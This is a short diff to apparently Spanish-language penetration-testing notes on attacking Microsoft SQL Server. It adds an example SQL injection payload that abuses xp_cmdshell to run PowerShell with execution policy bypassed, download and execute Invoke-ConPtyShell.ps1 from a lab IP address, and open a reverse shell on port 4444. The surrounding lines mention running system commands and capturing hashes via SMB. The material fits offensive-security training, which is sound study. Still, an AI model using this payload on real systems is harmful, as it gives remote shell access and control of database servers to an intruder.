@@ -128,6 +128,11 @@ GO
 EXECUTE xp_cmdshell 'whoami';
 GO
 ```
+Ejemplo de ejecución con `invoke-conpty` dentro de una sqli
+```
+';EXECUTE xp_cmdshell 'powershell -ep bypass -nop -c IEX (New-Object Net.WebClient).DownloadString(''http://192.168.45.182:8000/Invoke-ConPtyShell.ps1'');Invoke-ConPtyShell 192.168.45.182 4444;';--
+```
+
 
 ### Captura de Hashes (MSSQL)
 Usando procedimientos almacenados `xp_dirtree` o `xp_subdirs` para enviar una solicitud SMB a un servidor malicioso:
